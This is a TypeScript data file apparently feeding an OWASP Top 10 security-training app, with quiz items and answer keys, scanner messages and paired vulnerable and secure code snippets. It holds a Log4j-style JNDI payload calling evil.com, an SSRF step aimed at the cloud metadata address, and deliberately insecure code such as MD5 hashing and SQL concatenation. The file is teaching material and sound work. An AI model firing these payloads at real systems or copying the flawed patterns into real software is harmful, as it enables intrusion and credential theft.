import { OwaspItem, VulnerabilityID } from './types';

export const OWASP_DATA: OwaspItem[] = [
  {
    id: VulnerabilityID.A01,
    title: "Broken Access Control",
    shortDescription: "Users acting outside of their intended permissions.",
    fullDescription: "Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits.",
    architecture: "Access Control logic is often centralized in middleware or API gateways. Vulnerabilities occur when checks are missing on specific endpoints or when ID references (IDOR) are trusted without verification.",
    prevention: [
      "Deny by default.",
      "Implement access control mechanisms once and re-use them throughout the application.",
      "Model access controls should enforce record ownership rather than accepting that the user can create, read, update, or delete any record.",
      "Log access control failures."
    ],
    simulationType: 'ACCESS_CONTROL',
    audit: {
      question: "Review the following Node.js endpoint. What is the security flaw?",
      snippet: `app.delete('/account/:id', (req, res) => {\n  // Delete account based on URL param\n  db.deleteUser(req.params.id);\n  res.send('Deleted');\n});`,
      options: [
        "The endpoint uses the DELETE method which is insecure.",
        "There is no check to see if the requester owns the account ID (IDOR).",
        "The database function is named incorrectly.",
        "The response body is too short."
      ],
      correctAnswer: 1,
      explanation: "The code blindly accepts the 'id' from the URL and deletes that user without checking if the currently logged-in user has permission to delete it. This is an Insecure Direct Object Reference (IDOR)."
    },
    cicd: {
      toolName: "OWASP ZAP (DAST)",
      stage: "DAST",
      failMessage: "Alert: Access Control Issue. User A can access User B resources.",
      passMessage: "Access Control Verified. 403 Forbidden received for unauthorized access.",
      description: "Dynamic Application Security Testing (DAST) tools crawl the running application and attempt to access resources of other users to verify authorization boundaries."
    },
    codeSnippet: {
      language: 'javascript',
      description: "Middleware implementation for ownership verification.",
      vulnerable: `app.get('/api/data/:id', (req, res) => {
  // 🔴 VULNERABLE: No ownership check
  const data = db.find(req.params.id);
  res.json(data);
});`,
      secure: `app.get('/api/data/:id', (req, res) => {
  const data = db.find(req.params.id);
  
  // 🟢 SECURE: Check if data belongs to user
  if (data.ownerId !== req.user.id) {
    return res.status(403).send('Forbidden');
  }
  
  res.json(data);
});`
    }
  },
  {
    id: VulnerabilityID.A02,
    title: "Cryptographic Failures",
    shortDescription: "Failures related to cryptography, often leading to sensitive data exposure.",
    fullDescription: "Previously known as Sensitive Data Exposure. The focus is on failures related to cryptography which often leads to sensitive data exposure or system compromise. Common issues include weak keys, missing encryption, or poor certificate validation.",
    architecture: "Data should be encrypted at rest (Database) and in transit (TLS). Key management services (KMS) should be used instead of hardcoded keys.",
    prevention: [
      "Classify data processed, stored, or transmitted by an application.",
      "Don't store sensitive data unnecessarily.",
      "Encrypt all sensitive data at rest.",
      "Ensure up-to-date and strong standard algorithms, protocols, and keys are in place; use proper key management."
    ],
    simulationType: 'CRYPTO',
    audit: {
      question: "Which of the following implementations is vulnerable?",
      snippet: `// Option A: const cipher = crypto.createCipher('aes-256-gcm', key);\n// Option B: const hash = crypto.createHash('md5').update(password).digest('hex');`,
      options: [
        "Option A because AES-256 is too slow.",
        "Option B because MD5 is a broken hashing algorithm susceptible to collisions.",
        "Both are secure.",
        "Neither is vulnerable."
      ],
      correctAnswer: 1,
      explanation: "MD5 is considered cryptographically broken. It should not be used for password hashing or security-critical signatures. Use Argon2, bcrypt, or SHA-256/512 instead."
    },
    cicd: {
      toolName: "Semgrep (SAST)",
      stage: "SAST",
      failMessage: "Rule Violation: Weak Cryptographic Algorithm (MD5) detected.",
      passMessage: "No weak crypto primitives found.",
      description: "Static Application Security Testing (SAST) scans source code for known weak algorithms like MD5, SHA1, or hardcoded keys."
    },
    codeSnippet: {
      language: 'javascript',
      description: "Password Hashing Implementation.",
      vulnerable: `const crypto = require('crypto');

function storePassword(password) {
  // 🔴 VULNERABLE: MD5 is broken and fast (bad for passwords)
  return crypto.createHash('md5').update(password).digest('hex');
}`,
      secure: `const bcrypt = require('bcrypt');

async function storePassword(password) {
  // 🟢 SECURE: Bcrypt is slow by design and salted
  const saltRounds = 10;
  return await bcrypt.hash(password, saltRounds);
}`
    }
  },
  {
    id: VulnerabilityID.A03,
    title: "Injection",
    shortDescription: "Untrusted data is sent to an interpreter as part of a command or query.",
    fullDescription: "Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.",
    architecture: "Input validation layers and ORMs (Object-Relational Mappers) act as the primary defense. The vulnerability exists where raw strings are concatenated with user input before execution.",
    prevention: [
      "Use a safe API, which provides a parameterized interface, or migrate to use Object Relational Mapping Tools (ORMs).",
      "Use positive or 'whitelist' server-side input validation.",
      "For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter."
    ],
    simulationType: 'SQLI',
    audit: {
      question: "Which SQL query is safe from injection?",
      options: [
        "SELECT * FROM users WHERE name = '" + "userInput" + "'",
        "SELECT * FROM users WHERE name = `${userInput}`",
        "db.query('SELECT * FROM users WHERE name = ?', [userInput])",
        "db.execute('SELECT * FROM users WHERE name = ' + req.body.name)"
      ],
      correctAnswer: 2,
      explanation: "Option 3 uses a parameterized query (binding). The database engine treats the input as data, not executable code, preventing injection."
    },
    cicd: {
      toolName: "SonarQube",
      stage: "SAST",
      failMessage: "Critical: Security Hotspot - SQL Injection detected in query concatenation.",
      passMessage: "Code Smell Check: Passed. No raw SQL concatenation found.",
      description: "SAST tools analyze the data flow of user input into database sinks to ensure it is sanitized or parameterized."
    },
    codeSnippet: {
      language: 'sql',
      description: "SQL Query Construction.",
      vulnerable: `// 🔴 VULNERABLE: Direct Concatenation
String query = "SELECT * FROM accounts WHERE id = " + request.getParameter("id");`,
      secure: `// 🟢 SECURE: PreparedStatement (Java)
String query = "SELECT * FROM accounts WHERE id = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, request.getParameter("id"));`
    }
  },
  {
    id: VulnerabilityID.A04,
    title: "Insecure Design",
    shortDescription: "Missing or ineffective control design.",
    fullDescription: "A new category for 2021/2025 focusing on risks related to design flaws. If we strictly want to 'shift left', we need more threat modeling, secure design patterns, and reference architectures. An insecure design cannot be fixed by a perfect implementation.",
    architecture: "Threat modeling should happen during the design phase. Architecture reviews identify logic flaws (e.g., trust boundaries) before code is written.",
    prevention: [
      "Establish and use a secure development lifecycle with AppSec professionals.",
      "Limit resource consumption by user or service.",
      "Write unit and integration tests that validate critical flows.",
      "Use threat modeling for critical authentication, access control, business logic, and key flows."
    ],
    simulationType: 'GENERIC',
    simulationConfig: {
      scenario: "E-Commerce Discount Logic Flaw",
      steps: [
        { id: 1, instruction: "Add item to cart ($100)", actionLabel: "Add Item", expectedResult: "Cart Total: $100", isMalicious: false },
        { id: 2, instruction: "Apply 'WELCOME10' coupon", actionLabel: "Apply Coupon", expectedResult: "Cart Total: $90", isMalicious: false },
        { id: 3, instruction: "Reuse 'WELCOME10' coupon again (Design Flaw)", actionLabel: "Apply Again", expectedResult: "Cart Total: $80 (Exploited)", isMalicious: true }
      ]
    },
    audit: {
      question: "How do you best prevent 'Insecure Design' flaws?",
      options: [
        "Write more unit tests.",
        "Perform Threat Modeling and Architecture Reviews before coding.",
        "Use a better firewall.",
        "Encrypt all databases."
      ],
      correctAnswer: 1,
      explanation: "Insecure Design refers to flaws in the logic or architecture itself. Threat Modeling is the proactive process of identifying these risks during the design phase."
    },
    cicd: {
      toolName: "Manual Threat Model / Integration Tests",
      stage: "Build",
      failMessage: "Integration Test Failed: Coupon reuse logic permitted.",
      passMessage: "Business Logic Tests: Passed. Constraints enforced.",
      description: "While design is hard to scan, CI/CD can enforce business logic constraints via comprehensive integration tests that mimic abuse cases."
    },
    codeSnippet: {
      language: 'javascript',
      description: "Rate Limiting / Logic Constraints",
      vulnerable: `// 🔴 VULNERABLE: No check if coupon was already used
function applyCoupon(user, coupon) {
    cart.discount = coupon.value;
}`,
      secure: `// 🟢 SECURE: Design constraint enforced
function applyCoupon(user, coupon) {
    if (user.redeemedCoupons.includes(coupon.id)) {
        throw new Error("Coupon already used");
    }
    user.redeemedCoupons.push(coupon.id);
    cart.discount = coupon.value;
}`
    }
  },
  {
    id: VulnerabilityID.A05,
    title: "Security Misconfiguration",
    shortDescription: "Insecure default configurations, open cloud storage, etc.",
    fullDescription: "This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information.",
    architecture: "Configuration Management Systems (Ansible, Terraform) ensure consistent state. Drifts in configuration (e.g., leaving a debug port open in Prod) create vulnerabilities.",
    prevention: [
      "A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down.",
      "Minimal platform without any unnecessary features, components, documentation, and samples.",
      "Review and update the configurations appropriate to all security notes, updates, and patches."
    ],
    simulationType: 'GENERIC',
    simulationConfig: {
      scenario: "Default Admin Credentials",
      steps: [
        { id: 1, instruction: "Attempt login as 'admin'", actionLabel: "Login", expectedResult: "Password Required", isMalicious: false },
        { id: 2, instruction: "Try common password 'admin123'", actionLabel: "Try 'admin123'", expectedResult: "Access Denied", isMalicious: false },
        { id: 3, instruction: "Try default vendor password 'password'", actionLabel: "Try 'password'", expectedResult: "ADMIN DASHBOARD UNLOCKED", isMalicious: true }
      ]
    },
    audit: {
      question: "Which HTTP header is NOT a security hardening header?",
      options: [
        "X-Powered-By",
        "Content-Security-Policy",
        "Strict-Transport-Security",
        "X-Content-Type-Options"
      ],
      correctAnswer: 0,
      explanation: "'X-Powered-By' reveals server technology (e.g., Express, ASP.NET) which helps attackers. It should be removed, not added."
    },
    cicd: {
      toolName: "Trivy (IaC Scan)",
      stage: "Build",
      failMessage: "Config Failure: S3 Bucket 'public-read' is enabled.",
      passMessage: "IaC Scan: Passed. No misconfigurations found.",
      description: "Infrastructure as Code (IaC) scanners check Terraform, Dockerfiles, and Kubernetes configs for insecure defaults."
    }
  },
  {
    id: VulnerabilityID.A06,
    title: "Vulnerable and Outdated Components",
    shortDescription: "Using libraries/frameworks with known vulnerabilities.",
    fullDescription: "You are likely vulnerable if you do not know the versions of all components you use (both client-side and server-side). This includes components you directly use as well as nested dependencies.",
    architecture: "Software Composition Analysis (SCA) tools scan the dependency tree (node_modules, pom.xml) against CVE databases.",
    prevention: [
      "Remove unused dependencies, unnecessary features, components, files, and documentation.",
      "Continuously inventory the versions of both client-side and server-side components.",
      "Monitor for libraries like npm audit, OWASP Dependency Check."
    ],
    simulationType: 'GENERIC',
    simulationConfig: {
      scenario: "Legacy Library Exploit (Log4j style)",
      steps: [
        { id: 1, instruction: "User sends normal log message", actionLabel: "Send 'Hello'", expectedResult: "Log: 'Hello'", isMalicious: false },
        { id: 2, instruction: "Attacker sends JNDI payload", actionLabel: "Send '${jndi:ldap://evil.com/x}'", expectedResult: "Server Connects to evil.com", isMalicious: true }
      ]
    },
    audit: {
      question: "What is the primary way to detect known vulnerabilities in your dependencies?",
      options: [
        "Manually reading the source code of every library.",
        "Using Software Composition Analysis (SCA) tools.",
        "Running the app and hoping it doesn't crash.",
        "Disabling all third-party libraries."
      ],
      correctAnswer: 1,
      explanation: "SCA tools (like Snyk, Dependabot, npm audit) automatically compare your 'package.json' or 'pom.xml' against databases of known CVEs."
    },
    cicd: {
      toolName: "Snyk / npm audit",
      stage: "SCA",
      failMessage: "High Severity: 'lodash' < 4.17.21 (CVE-2021-23337).",
      passMessage: "Dependency Check: Passed. No vulnerable packages.",
      description: "SCA runs early in the pipeline to block builds that include libraries with known critical vulnerabilities."
    }
  },
  {
    id: VulnerabilityID.A07,
    title: "Identification and Authentication Failures",
    shortDescription: "Weaknesses in session management or credential handling.",
    fullDescription: "Previously Broken Authentication. Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks.",
    architecture: "Identity Providers (IdP) or Auth0/Okta integration centralizes auth. Weaknesses occur in custom session handling or allowing weak passwords.",
    prevention: [
      "Multi-factor authentication (MFA) is now required for virtually all access.",
      "Do not deploy with default credentials.",
      "Implement weak-password checks, such as testing against a list of the top 10,000 worst passwords."
    ],
    simulationType: 'GENERIC',
    simulationConfig: {
      scenario: "Session Hijacking",
      steps: [
        { id: 1, instruction: "Login as User A", actionLabel: "Login", expectedResult: "Session ID: 1001 assigned", isMalicious: false },
        { id: 2, instruction: "Predict next Session ID", actionLabel: "Guess ID 1002", expectedResult: "Accessing User B Account (Success)", isMalicious: true }
      ]
    },
    audit: {
      question: "Which practice effectively mitigates Credential Stuffing attacks?",
      options: [
        "Requiring users to rotate passwords every 30 days.",
        "Multi-Factor Authentication (MFA).",
        "Hiding the login page.",
        "Using HTTP Basic Auth."
      ],
      correctAnswer: 1,
      explanation: "MFA prevents access even if the attacker has the correct password (often stolen from other breaches). Password rotation is actually deprecated by NIST."
    },
    cicd: {
      toolName: "ZAP (Auth Scan)",
      stage: "DAST",
      failMessage: "Auth Failure: Session ID remains valid after logout.",
      passMessage: "Auth Check: Passed. Cookies are HttpOnly and Secure.",
      description: "DAST tools can check for common authentication flaws like weak cookie flags or session fixation."
    }
  },
  {
    id: VulnerabilityID.A08,
    title: "Software and Data Integrity Failures",
    shortDescription: "Code or infrastructure that does not protect against integrity violations.",
    fullDescription: "Focuses on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. For example, an application relying on plugins from untrusted sources.",
    architecture: "Code signing and checksum verification ensure artifacts haven't been tampered with between build and deploy.",
    prevention: [
      "Ensure unsigned or unencrypted data is not sent to the client.",
      "Ensure your CI/CD pipeline has proper segregation, configuration, and access control.",
      "Verify the integrity of downloaded modules."
    ],
    simulationType: 'GENERIC',
    simulationConfig: {
      scenario: "Insecure Deserialization",
      steps: [
        { id: 1, instruction: "Receive serialized object cookie", actionLabel: "Read Cookie", expectedResult: "Object { role: 'user' }", isMalicious: false },
        { id: 2, instruction: "Tamper object state in transit", actionLabel: "Modify to { role: 'admin' }", expectedResult: "Object Deserialized as Admin", isMalicious: true }
      ]
    },
    audit: {
      question: "Why is insecure deserialization dangerous?",
      options: [
        "It makes the database slow.",
        "It allows an attacker to manipulate object state or execute code by modifying serialized data.",
        "It increases the file size of the data.",
        "It only affects Java applications."
      ],
      correctAnswer: 1,
      explanation: "If the application deserializes data from an untrusted source without verification, an attacker can modify the logic or execute arbitrary code (RCE)."
    },
    cicd: {
      toolName: "Cosign / Sigstore",
      stage: "Deploy",
      failMessage: "Integrity Error: Docker image signature verification failed.",
      passMessage: "Artifact Signature: Verified. Trusted Publisher.",
      description: "In the deployment stage, the pipeline checks cryptographic signatures to ensure the build artifact hasn't been tampered with."
    }
  },
  {
    id: VulnerabilityID.A09,
    title: "Security Logging and Monitoring Failures",
    shortDescription: "Failures to log/monitor allow attackers to maintain persistence.",
    fullDescription: "Insufficient logging, detection, monitoring, and active response occurs any time: Auditable events, such as logins, failed logins, and high-value transactions are not logged.",
    architecture: "SIEM (Security Information and Event Management) aggregates logs. The failure is usually in the application not emitting the logs or the operations team ignoring alerts.",
    prevention: [
      "Ensure all login, access control, and server-side input validation failures can be logged.",
      "Ensure logs are generated in a format that can be easily consumed by a centralized log management solution.",
      "Establish an incident response and recovery plan."
    ],
    simulationType: 'GENERIC',
    simulationConfig: {
      scenario: "Silent Brute Force",
      steps: [
        { id: 1, instruction: "Attacker tries 1000 passwords", actionLabel: "Run Attack", expectedResult: "Login Failed (1000x)", isMalicious: true },
        { id: 2, instruction: "Check System Logs", actionLabel: "View Logs", expectedResult: "No Alerts Triggered (Vulnerable)", isMalicious: true }
      ]
    },
    audit: {
      question: "What should NEVER be included in security logs?",
      options: [
        "Failed login attempts.",
        "User IDs.",
        "Plain-text passwords or credit card numbers.",
        "Timestamps."
      ],
      correctAnswer: 2,
      explanation: "Logging sensitive data (PII, credentials) creates a massive security risk if the logs are leaked. This is a common compliance violation."
    },
    cicd: {
      toolName: "Log Aggregation Test",
      stage: "Deploy",
      failMessage: "Alerting Test: Failed. Brute force simulation triggered no alerts.",
      passMessage: "SIEM Connection: Verified. Alerts active.",
      description: "Post-deployment tests can simulate attacks to verify that the monitoring system triggers the expected alerts."
    }
  },
  {
    id: VulnerabilityID.A10,
    title: "Server-Side Request Forgery (SSRF)",
    shortDescription: "Fetching a remote resource without validating the user-supplied URL.",
    fullDescription: "SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination.",
    architecture: "The application server acts as a proxy. Vulnerability arises when it can reach internal networks (VPC) that public users shouldn't reach.",
    prevention: [
      "Segment remote resource access functionality in separate networks to reduce the impact of SSRF.",
      "Sanitize and validate all client-supplied input data.",
      "Enforce a strict allowlist of domains/IPs."
    ],
    simulationType: 'GENERIC',
    simulationConfig: {
      scenario: "Cloud Metadata Extraction",
      steps: [
        { id: 1, instruction: "Enter URL for profile image", actionLabel: "Fetch google.com", expectedResult: "Image Loaded", isMalicious: false },
        { id: 2, instruction: "Enter AWS Metadata URL", actionLabel: "Fetch 169.254.169.254", expectedResult: "AWS Keys Exposed!", isMalicious: true }
      ]
    },
    audit: {
      question: "Which of the following prevents SSRF?",
      options: [
        "Using HTTPS.",
        "Validating the URL against a strictly defined allowlist (e.g., only 'example.com').",
        "Disabling cookies.",
        "Running the server as root."
      ],
      correctAnswer: 1,
      explanation: "SSRF happens when the server fetches arbitrary URLs. An allowlist ensures the server only talks to trusted destinations."
    },
    cicd: {
      toolName: "Cloud Security Scanner",
      stage: "Deploy",
      failMessage: "Network Policy: Egress to 169.254.169.254 is ALLOWED (Risk).",
      passMessage: "Egress Filtering: Enforced. Internal Metadata blocked.",
      description: "Cloud configuration scanners ensure that compute instances have network policies blocking access to sensitive internal metadata services."
    }
  },
  // --- BONUS ITEMS ---
  {
    id: VulnerabilityID.A11,
    title: "Cross-Site Request Forgery (CSRF)",
    shortDescription: "Forcing an end user to execute unwanted actions.",
    fullDescription: "CSRF forces an end user to execute unwanted actions on a web application in which they're currently authenticated. With a little help of social engineering (such as sending a link via email), an attacker may force the users of a web application to execute actions of the attacker's choosing.",
    architecture: "State-changing requests (POST/PUT) must not rely solely on cookies that are automatically sent by the browser. Anti-CSRF tokens or SameSite cookies are architectural controls.",
    prevention: [
      "Use Anti-CSRF tokens (Synchronizer Token Pattern).",
      "Use SameSite cookie attribute (Strict or Lax).",
      "Require re-authentication for sensitive actions."
    ],
    simulationType: 'GENERIC',
    simulationConfig: {
      scenario: "Hidden Form Submission",
      steps: [
        { id: 1, instruction: "User is logged into Bank.com", actionLabel: "Check Status", expectedResult: "Logged In", isMalicious: false },
        { id: 2, instruction: "User visits malicious-site.com", actionLabel: "Visit Link", expectedResult: "Malicious site loads hidden form", isMalicious: true },
        { id: 3, instruction: "Hidden form POSTs to Bank.com", actionLabel: "Auto-Submit", expectedResult: "$1000 Transferred (Cookies sent auto)", isMalicious: true }
      ]
    },
    audit: {
      question: "Why doesn't HTTPS prevent CSRF?",
      options: [
        "HTTPS only encrypts data in transit; it doesn't verify the origin of the request intent.",
        "It does prevent it, this is a trick question.",
        "HTTPS is too slow.",
        "CSRF only happens on HTTP."
      ],
      correctAnswer: 0,
      explanation: "CSRF exploits the browser's behavior of automatically sending cookies. Encryption (HTTPS) protects the payload from sniffing but not from the browser sending it willingly to the valid server."
    },
    cicd: {
      toolName: "ZAP (Passive Scan)",
      stage: "DAST",
      failMessage: "Risk: POST /transfer lacks Anti-CSRF token.",
      passMessage: "CSRF Protection: Tokens found in all forms.",
      description: "DAST tools scan HTML forms to ensure that hidden anti-CSRF tokens are present."
    }
  },
  {
    id: VulnerabilityID.A12,
    title: "Clickjacking",
    shortDescription: "Trick users into clicking something different from what they see.",
    fullDescription: "Clickjacking (UI redressing) is a malicious technique of tricking a user into clicking on something different from what the user perceives, effectively revealing confidential information or taking control of their computer while clicking on seemingly innocuous objects.",
    architecture: "This is a frontend architectural issue. The application must forbid itself from being framed by other domains.",
    prevention: [
      "Send the X-Frame-Options HTTP header (DENY or SAMEORIGIN).",
      "Implement Content Security Policy (CSP) with frame-ancestors directive."
    ],
    simulationType: 'GENERIC',
    simulationConfig: {
      scenario: "Transparent Overlay Attack",
      steps: [
        { id: 1, instruction: "Attacker creates 'Win an iPad' page", actionLabel: "Load Page", expectedResult: "Button 'Claim Prize' visible", isMalicious: true },
        { id: 2, instruction: "Load target site in invisible iframe", actionLabel: "Load Iframe", expectedResult: "Target 'Delete Account' button positioned over 'Claim Prize'", isMalicious: true },
        { id: 3, instruction: "User clicks 'Claim Prize'", actionLabel: "Click", expectedResult: "Account Deleted (Click captured by iframe)", isMalicious: true }
      ]
    },
    audit: {
      question: "Which header effectively stops Clickjacking?",
      options: [
        "X-XSS-Protection",
        "X-Frame-Options: DENY",
        "Access-Control-Allow-Origin",
        "Authorization: Bearer"
      ],
      correctAnswer: 1,
      explanation: "X-Frame-Options: DENY (or SAMEORIGIN) tells the browser not to allow this page to be rendered inside a <frame>, <iframe>, or <object>."
    },
    cicd: {
      toolName: "Mozilla Observatory",
      stage: "Build",
      failMessage: "Header Missing: X-Frame-Options not set.",
      passMessage: "Frame Protection: Verified (SAMEORIGIN).",
      description: "Header analysis tools verify that security headers preventing framing are present on all responses."
    }
  }
];